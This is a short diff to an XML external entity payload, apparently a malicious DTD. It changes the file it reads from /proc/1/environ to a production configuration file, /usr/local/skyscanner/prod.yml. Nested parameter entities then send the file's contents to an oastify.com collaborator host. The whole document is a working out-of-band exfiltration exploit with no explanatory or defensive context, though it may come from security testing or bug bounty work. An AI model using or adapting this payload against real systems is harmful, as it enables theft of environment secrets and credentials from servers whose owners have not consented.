@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///proc/1/environ">
+<!ENTITY % file SYSTEM "file:///usr/local/skyscanner/prod.yml">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://wrrgnl3bjajb1ps5dpk66hhwzn5et4ht.oastify.com/?exf=%file;'>">
 %eval;
 %exfil;
